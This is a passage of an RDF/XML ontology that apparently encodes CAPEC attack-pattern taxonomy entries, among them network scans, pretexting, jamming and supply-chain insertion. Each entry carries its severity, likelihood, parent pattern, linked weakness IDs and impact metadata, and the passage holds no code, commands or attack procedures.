                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack341">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#511">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:444::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Infiltration of Software Development Environment"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack188">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#304">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:300::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#TCP Null Scan"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack243">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#310">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:541::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Scanning for Vulnerable Software"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack37">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#547">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:607::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Physical Destruction of Device or Component"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack484">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#326">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:312::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#TCP Initial Window Size Probe"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack249">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#187">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:186::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Malicious Automated Software Update"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::494::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack397">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#599">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:195::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Terrestrial Jamming"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Availability Other A successful attack will deny  degrade  or disrupt availability of satellite communications for the target by overwhelming its resources to accurately receive authorized transmissions.::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <rdf:type rdf:resource="http://krstProj.com/capec#Skill"/>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack65">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#413">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:407::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Pretexting via Tech Support"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack238">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#189">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:188::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Black Box Reverse Engineering"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack310">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#607">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Obstruction"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack490">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#319">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:312::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#IP (DF) &apos;Don&apos;t Fragment Bit&apos; Echoing Probe"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack202">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#305">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:300::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#TCP ACK Scan"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack59">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#191">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:167::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Read Sensitive Strings Within an Executable"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::798::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack485">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#325">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:312::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#TCP Congestion Control Flag (ECN) Probe"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack3">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#195">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:151::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Principal Spoof"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack17">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#506">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:173::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Tapjacking"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::1021::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <rdf:type rdf:resource="http://krstProj.com/capec#Consequence"/>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack117">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#441">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Malicious Logic Insertion"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::284::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <rdf:type rdf:resource="http://krstProj.com/capec#MitigationAction"/>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack293">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#384">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:94::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Application API Message Manipulation via Man-in-the-Middle"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::471::345::346::602::311::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack257">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#177">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:17::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Create files with the same name as files protected with a higher classification"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::706::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack515">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#435">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:427::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Target Influence via Instant Rapport"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack192">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#293">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:309::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Traceroute Route Enumeration"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack64">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#414">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:407::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Pretexting via Delivery Person"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack134">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#113">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#API Manipulation"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::227::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <rdf:type rdf:resource="http://krstProj.com/capec#Likelihood"/>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack390">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#585">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:582::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#DNS Domain Seizure"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Availability Other Disabling a target domain at the infrastructure level denies the availability of its service to the user.::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack354">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#521">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:447::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Hardware Design Specifications Are Altered"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack263">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#149">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:497::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
